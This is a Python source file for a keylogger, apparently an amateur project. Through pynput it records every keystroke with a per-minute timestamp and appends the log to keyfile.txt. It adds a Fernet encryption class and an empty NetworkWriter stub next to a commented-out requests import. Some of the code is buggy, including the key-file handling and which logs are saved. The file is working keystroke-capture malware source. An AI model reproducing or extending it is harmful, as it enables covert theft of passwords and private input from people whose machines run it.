import time, os
from pynput import keyboard
from cryptography.fernet import Fernet
# from requests import request
# import json

class KeyLoggerService:
    def __init__(self):
        self.global_log = []
        self.log_l = {}
        self.long_str = ""

    @staticmethod
    def get_time():
        """Get The time by Minutes"""
        formatted_time = time.strftime("%Y-%m-%d %H:%M", time.localtime())
        return formatted_time

    def make_long_str(self, key):
        """Makes a long str to chek the last characters"""
        if hasattr(key, 'char') and key.char:
            self.long_str += key.char

    def make_dict(self, key):
        """Making The directory of the log"""
        now = self.get_time()
        token = key.char if hasattr(key, 'char') and key.char else str(key)
        if now in self.log_l:
            self.log_l[now].append(token)
        else:
            self.log_l[now] = [token]

class KeyLoggerManager:
    def __init__(self, service, writer):
        self.log_l = None
        self.Key = None
        self.global_log = None
        self.long_str = None
        self.service = service
        self.writer = writer

    def key_for_log(self, key):
        """Loging Every key to all the function needed"""
        self.service.make_long_str(key)
        self.service.make_dict(key)

        if self.service.long_str[-4:] == "exit":
            print("Detected 'exit' key:", list(self.service.long_str))
            self.service.long_str = ""

        elif key == keyboard.Key.space:
            self.service.global_log.append(self.service.log_l)
            self.service.log_l = {}

        elif key == keyboard.Key.esc:
            self.service.global_log.append(self.service.log_l)
            for d in self.service.global_log:
                for minute in d:
                    print(f"{minute}\n{d[minute]} ")
            self.writer.outing_to_file(self.service.log_l)
            return False

        return None

    def starting_listening(self):
        """Start listening"""
        self.service.log_l = {}
        self.service.long_str = ""
        with keyboard.Listener(on_release=self.key_for_log) as listener:
            listener.join()

class FileWriter:
    def outing_to_file(self, grouped):
        with open("keyfile.txt", "a", encoding="utf-8") as f:
            for minute, items in grouped.items():
                f.write(minute + "\n")
                for t in items:
                    f.write(str(t) + "\n")

class Encryptor:
    def __init__(self):
        self.output_filename = None
        self.key = None
        self.original = self
        self.encrypted = self
        self.decrypted = self

    def encrypt_file(self, output_filename, key):
        f = Fernet(key)
        with open(self.output_filename, 'rb') as file:
            data = file.read()
        enc = f.encrypt(data)
        with open(output_filename, 'wb') as file:
            file.write(enc)

    def decrypt_file(self, output_filename, key):
        f = Fernet(key)
        with open(self.output_filename, 'rb') as file:
            data = file.read()
        dec = f.decrypt(data)
        with open(output_filename, 'wb') as file:
            file.write(dec)

    def make_key(self):
        if not os.path.exists("key.key"):
            key = Fernet.generate_key()
            with open("key.key", "wb") as f:
                f.write(key)
        else:
            with open("key.key", "rb") as f:
                self.key = f.read()
        print("Key:", self.key.decode())

class NetworkWriter:
    pass

if __name__ == "__main__":
    service = KeyLoggerService()
    writer = FileWriter()
    manager = KeyLoggerManager(service, writer)
    manager.starting_listening()
